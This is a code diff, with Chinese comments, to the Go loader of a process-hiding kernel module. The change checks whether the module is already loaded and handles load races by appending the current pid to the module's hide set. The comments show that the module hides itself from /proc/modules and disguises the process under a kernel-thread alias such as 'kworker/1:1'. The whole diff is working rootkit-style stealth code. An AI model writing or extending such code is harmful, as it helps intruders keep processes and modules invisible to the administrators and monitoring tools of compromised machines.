@@ -28,6 +28,18 @@ func kernelHide(c Config) error {
 	if _, err := os.Stat(path); err != nil {
 		return fmt.Errorf("模块不存在 %s: %w", path, err)
 	}
+
+	// 模块已经在内核里（上一个进程没卸载干净，或安装脚本先加载过）：
+	// 重复 finit_module 只会拿到 EEXIST / EINVAL，没必要再试一次，直接
+	// 把当前 pid 追加进隐藏集合即可。hide_module=1 时 /proc/modules 看不到
+	// 本模块，所以这里靠 /sys/module/<name> 判断。
+	if kernelModuleLoaded() {
+		// 追加失败也不致命：模块按 target_comm 名字过滤同名进程，
+		// 当前进程的 comm 已被设成 alias，仍然会被隐藏。
+		_ = kernelAddPID(os.Getpid())
+		return nil
+	}
+
 	// 进程别名要传给 target_comm，不能盖到 dev_name 上：
 	// dev_name 决定 /dev/<name> 设备节点，alias 里带 "/"（如 kworker/1:1）
 	// 会让节点建不出来，/dev/v2hide 不存在，后续 kernelAddPID 全部失效。
@@ -38,15 +50,10 @@ func kernelHide(c Config) error {
 	if err == nil {
 		return nil
 	}
-	// 模块已在内核里（上一个进程没卸载干净，或安装脚本已加载过）。
-	// 此时旧实例的 target_pid 可能指向已退出的进程，所以要主动把当前 pid
-	// 追加进它的隐藏集合，否则本进程不会被隐藏。
-	if errors.Is(err, unix.EEXIST) {
-		if e := kernelAddPID(os.Getpid()); e == nil {
-			return nil
-		} else {
-			return fmt.Errorf("模块已加载但无法把当前 pid 加入隐藏集合: %w", e)
-		}
+	// 竞态兜底：刚判断完「没加载」但别的实例抢先加载了
+	if errors.Is(err, unix.EEXIST) || errors.Is(err, unix.EINVAL) {
+		_ = kernelAddPID(os.Getpid())
+		return nil
 	}
 	// 回退：某些内核/受限容器里 finit_module 会被拦，改用 kmod 的 insmod。
 	// 注意 environ 已被清空、PATH 不在了，必须按绝对路径找工具。
@@ -63,6 +70,19 @@ func kernelHide(c Config) error {
 		return fmt.Errorf("finit_module: %v; insmod: %v (%s)", err, e, msg)
 	}
 	return nil
+}
+
+// kernelModuleLoaded 判断隐藏模块是否已经在内核里。
+// hide_module=1 时模块会把自己从 /proc/modules 摘掉，所以先看 /sys/module：
+// 我们不再 kobject_del 自身，该目录会一直保留，判断可靠。
+func kernelModuleLoaded() bool {
+	if st, err := os.Stat("/sys/module/" + linuxModuleName); err == nil && st.IsDir() {
+		return true
+	}
+	if b, err := os.ReadFile("/proc/modules"); err == nil {
+		return strings.Contains(string(b), linuxModuleName)
+	}
+	return false
 }
 
 // findKmodTool 按绝对路径找 kmod 工具：re-exec 清空 environ 之后 PATH 已失效，
